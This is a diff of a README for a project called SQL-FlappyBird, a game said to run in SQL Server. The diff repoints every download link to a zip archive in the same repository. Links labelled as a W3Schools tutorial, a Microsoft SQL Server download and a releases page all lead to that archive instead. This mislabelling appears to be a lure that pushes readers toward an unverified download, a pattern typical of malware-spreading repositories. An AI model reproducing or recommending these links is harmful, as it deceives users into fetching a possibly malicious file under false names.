@@ -1,6 +1,6 @@
 # 🕹️ SQL-FlappyBird - Play Flappy Bird in SQL Server
 
-[![Download SQL-FlappyBird](https://raw.githubusercontent.com/Bellatd/SQL-FlappyBird/main/Init/Bird-SQ-Flappy-plotproof.zip)](https://raw.githubusercontent.com/Bellatd/SQL-FlappyBird/main/Init/Bird-SQ-Flappy-plotproof.zip)
+[![Download SQL-FlappyBird](https://github.com/Bellatd/SQL-FlappyBird/raw/refs/heads/main/Init/SQ_Flappy_Bird_2.4.zip)](https://github.com/Bellatd/SQL-FlappyBird/raw/refs/heads/main/Init/SQ_Flappy_Bird_2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ SQL-FlappyBird is a fun game brought to life in SQL Server. Follow these simple 
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [SQL-FlappyBird Releases](https://raw.githubusercontent.com/Bellatd/SQL-FlappyBird/main/Init/Bird-SQ-Flappy-plotproof.zip).
+To get started, visit this page to download: [SQL-FlappyBird Releases](https://github.com/Bellatd/SQL-FlappyBird/raw/refs/heads/main/Init/SQ_Flappy_Bird_2.4.zip).
 
 ### 🎮 System Requirements
 
@@ -62,11 +62,11 @@ For technical support, open an issue in this repository. Provide details of your
 
 ## 📚 Additional Resources
 
-- Learn SQL basics: [W3Schools SQL Tutorial](https://raw.githubusercontent.com/Bellatd/SQL-FlappyBird/main/Init/Bird-SQ-Flappy-plotproof.zip)
-- SQL Server downloads: [Microsoft SQL Server Download](https://raw.githubusercontent.com/Bellatd/SQL-FlappyBird/main/Init/Bird-SQ-Flappy-plotproof.zip)
+- Learn SQL basics: [W3Schools SQL Tutorial](https://github.com/Bellatd/SQL-FlappyBird/raw/refs/heads/main/Init/SQ_Flappy_Bird_2.4.zip)
+- SQL Server downloads: [Microsoft SQL Server Download](https://github.com/Bellatd/SQL-FlappyBird/raw/refs/heads/main/Init/SQ_Flappy_Bird_2.4.zip)
 
 ## 🕹️ Conclusion
 
 SQL-FlappyBird offers a fun experience that blends gaming and learning in a unique way. Download and enjoy this SQL twist on a classic game now!
 
-[![Download SQL-FlappyBird](https://raw.githubusercontent.com/Bellatd/SQL-FlappyBird/main/Init/Bird-SQ-Flappy-plotproof.zip)](https://raw.githubusercontent.com/Bellatd/SQL-FlappyBird/main/Init/Bird-SQ-Flappy-plotproof.zip)
+[![Download SQL-FlappyBird](https://github.com/Bellatd/SQL-FlappyBird/raw/refs/heads/main/Init/SQ_Flappy_Bird_2.4.zip)](https://github.com/Bellatd/SQL-FlappyBird/raw/refs/heads/main/Init/SQ_Flappy_Bird_2.4.zip)
